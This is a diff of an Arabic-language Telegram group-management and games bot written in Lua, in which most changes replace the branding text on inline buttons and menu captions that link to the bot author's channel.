 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/55/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12874,7 +12873,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/uu_regan/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12884,7 +12883,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12894,7 +12893,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12904,7 +12903,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12914,7 +12913,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12924,7 +12923,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12934,7 +12933,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12944,7 +12943,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❨  𖣘• ⁽ՏᎪYͲᎡᎪ₎ •𖣘 ❩', url="t.me/mo1ibrahim"}},
+{{text = '❨  𖣘• ⁽〠ՏᎪYͲᎡᎪ〠₎ •𖣘 ❩', url="t.me/mo1ibrahim"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/72/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12954,7 +12953,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/uu_regan/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12964,7 +12963,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/uu_regan/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12974,7 +12973,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Qtdao/15&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12984,7 +12983,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12994,7 +12993,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/16&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -13005,7 +13004,7 @@ ght = math.random(3,300);
 local Text =' ' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》 ', url="t.me/uu_regan"}}, 
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ', url="t.me/uu_regan"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&Photo=https://t.me/wffhvv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -15092,7 +15091,7 @@ local List = {
 [[
 .𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
 .𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
-.𖣂 𝙡𝘿 , #id  
+.?? 𝙡𝘿 , #id  
 .𖣂 𝙂𝙖𝙢𝙨 , #game 
 .𖣂 𝙢𝙨𝙂𝙨 , #msgs
 ]],
@@ -16823,7 +16822,7 @@ local Text =[[
 اهلا بك في اوامر المجموعه.🚦
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
 اختر الامر الذي تريده بـ الأسفل.⬇️
-[《🦹‍♂ ᏟᎻ 🦹‍♂》](t.me/uu_regan)
+[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》](t.me/uu_regan)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -16840,7 +16839,7 @@ keyboard.inline_keyboard = {
 {text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -16854,7 +16853,7 @@ local Text = [[
 [🕹اضغط علي الأزرار في الأسفل  .↑]
 [🎯ألعاب سورس ريجان الاحسن في التليجرام .↑]
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
- [《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)
+ [《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -16868,7 +16867,7 @@ keyboard.inline_keyboard = {
 {text = 'الاوامر🎡', callback_data="/help90"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -16887,7 +16886,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = '˹《🦹‍♂ ᏟᎻ 🦹‍♂》˼', url="t.me/uu_regan"},
+{text = '˹《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》˼', url="t.me/uu_regan"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -17279,7 +17278,7 @@ local Teext =[[
  🌏الجهات
  🌏الاشعارات
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17337,7 +17336,7 @@ local Teext =[[
  🌏  مسح الكلمات الممنوعه
  🌏 المميزين عام
  🌏  ❲ + ❳ جميع ماسبق
- ??━┅┄⟞⟦🦹‍♂ ᏟᎻ 🦹‍♂⟧⟝┄┉━??
+ ??━┅┄⟞⟦〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠⟧⟝┄┉━??
  🌏 ❲ المالك❳ ⇊
  𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
  🌏 اضف صوره ⌁ وصف (للجروب)
@@ -17351,7 +17350,7 @@ local Teext =[[
  🌏 المنشئين ⌁  مسح المنشئين
  🌏  ❲ + ❳ جميع ماسبق
  𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17411,7 +17410,7 @@ local Teext =[[
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
  🌏الاوامر المضافه ( لعرض الاوامر المضافه ) 
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17447,7 +17446,7 @@ local Teext =[[
  🌏القيود 
  🌏تنزيل جميع الرتب
  🌏تنزيل الكل 
-𖣘━┅┄⟞⟦🦹‍♂ ᏟᎻ 🦹‍♂⟧⟝┄┉━??
+𖣘━┅┄⟞⟦〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠⟧⟝┄┉━??
  🌏اوامر التغير …
 𖣘━┅┄⟞⟦𝚂𝙾??𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘
  🌏تغير رد المطور + اسم
@@ -17507,7 +17506,7 @@ local Teext =[[
  🌏الساعه
  🌏التاريخ
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17596,7 +17595,7 @@ local Teext =[[
  🌏تفعيل/تعطيل المغادره
  🌏مسح الجروبات
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17636,7 +17635,7 @@ local Teext =[[
  🌏   بتحب دي ⌁ بتحب ده
  🌏  بوت الحذف⌁رابط الحذف
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17705,7 +17704,7 @@ local Teext =[[
  🌏تنزيل ←من زبي 
  🌏تاك للمتناكين
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17730,7 +17729,7 @@ local Teext =[[
  اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
 ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
-❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17744,7 +17743,7 @@ keyboard.inline_keyboard = {
 {text = 'ااوامر اصحاب الرتب ⇊', callback_data="/help2"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -17857,7 +17856,7 @@ keyboard.inline_keyboard = {
 {{text = 'غنيلي', callback_data="/help17"}},
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/help7"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17872,7 +17871,7 @@ local Teext =[[
  اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
 ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
- ❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+ ❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17889,7 +17888,7 @@ keyboard.inline_keyboard = {
 {text = '◗القائمه الرائسيه◖', callback_data="/add"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -17911,7 +17910,7 @@ keyboard.inline_keyboard = {
 {{text = 'لعبه كشف الكذب', callback_data="/help47"}},
 {{text = 'مريم', callback_data="/help36"},{text = 'عقاب', callback_data="/help42"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -18020,7 +18019,7 @@ keyboard.inline_keyboard = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -18049,7 +18048,7 @@ local Teext =[[
  🌏   بتحب دي ⌁ بتحب ده
  🌏  بوت الحذف⌁رابط الحذف
 𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘
- ❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+ ❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -18057,7 +18056,7 @@ keyboard.inline_keyboard = {
 {text = '◗القائمه الرائسيه◖', callback_data="/change-id"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -18075,7 +18074,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -18096,7 +18095,7 @@ keyboard.inline_keyboard = {
 {{text = 'غنيلي', callback_data="/help17"}},
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -18178,10 +18177,10 @@ end
 --- callback added
 if Text == '/add' then
 local Teext =[[
-🎮 اهلا بك في قسم الالعاب ..↑⟦🦹‍♂ ᏟᎻ 🦹‍♂⟧
-🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦🦹‍♂ ᏟᎻ 🦹‍♂⟧
+🎮 اهلا بك في قسم الالعاب ..↑⟦〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠⟧
+🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠⟧
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
- ❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 
+ ❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -18195,7 +18194,7 @@ keyboard.inline_keyboard = {
 {text = 'الاوامر🎡', callback_data="/help12"},
 },
 {
-{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"},
+{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
